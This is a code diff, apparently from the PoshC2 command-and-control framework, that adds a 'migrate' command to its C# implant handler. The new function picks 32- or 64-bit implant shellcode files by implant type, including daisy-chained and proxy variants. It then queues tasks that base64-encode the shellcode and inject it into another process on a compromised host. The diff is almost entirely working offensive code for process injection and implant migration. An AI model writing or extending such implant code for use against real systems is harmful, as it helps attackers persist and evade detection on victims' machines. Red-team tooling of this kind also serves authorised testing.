@@ -5,7 +5,7 @@ from Utils import randomuri, validate_sleep_time
 from DB import new_task, update_sleep, update_label, unhide_implant, kill_implant, get_implantdetails, get_pid
 from AutoLoads import check_module_loaded, run_autoloads_sharp
 from Help import sharp_help1
-from Config import ModulesDirectory, POSHDIR
+from Config import ModulesDirectory, POSHDIR, ROOTDIR
 from Core import readfile_with_completion, shellcodereadfile_with_completion
 from Utils import argp, load_file
 
@@ -85,6 +85,11 @@ def handle_sharp_command(command, user, randomuri, startup):
             new_task("run-exe Core.Program Core Inject-Shellcode %s%s #%s" % (base64.b64encode(shellcodefile),params, os.path.basename(path)), user, randomuri)
         except Exception as e:
           print ("Error loading file: %s" % e)
+
+    elif "migrate" in command.lower():
+      params = re.compile("migrate", re.IGNORECASE)
+      params = params.sub("", command)
+      migrate(randomuri, user, params)
 
     elif "kill-implant" in command.lower() or "exit" in command.lower():
         impid = get_implantdetails(randomuri)
@@ -214,3 +219,28 @@ def handle_sharp_command(command, user, randomuri, startup):
         if command:
           new_task(command, user, randomuri)
         return
+
+def migrate(randomuri, user, params=""):
+  implant = get_implantdetails(randomuri)
+  implant_arch = implant[10]
+  implant_comms = implant[15]
+
+  if implant_arch == "AMD64":
+    arch = "64"
+  else:
+    arch = "86"
+
+  if implant_comms == "C#":
+    path = "%spayloads/Sharp_v4_x%s_Shellcode.bin" % (ROOTDIR,arch)
+    shellcodefile = load_file(path)
+  elif "Daisy" in implant_comms:
+    daisyname = raw_input("Name required: ")
+    path = "%spayloads/%sSharp_v4_x%s_Shellcode.bin" % (ROOTDIR,daisyname,arch)
+    shellcodefile = load_file(path)
+  elif "Proxy" in implant_comms:
+    path = "%spayloads/ProxySharp_v4_x%s_Shellcode.bin" % (ROOTDIR,arch)
+    shellcodefile = load_file(path)
+
+  new_task("run-exe Core.Program Core Inject-Shellcode %s%s #%s" % (base64.b64encode(shellcodefile),params, os.path.basename(path)), user, randomuri)
+  new_task("$Shellcode%s=\"%s\" #%s" % (arch,base64.b64encode(shellcodefile), os.path.basename(path)), user, randomuri)
+  new_task("Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode%s))%s" % (arch, params), user, randomuri)
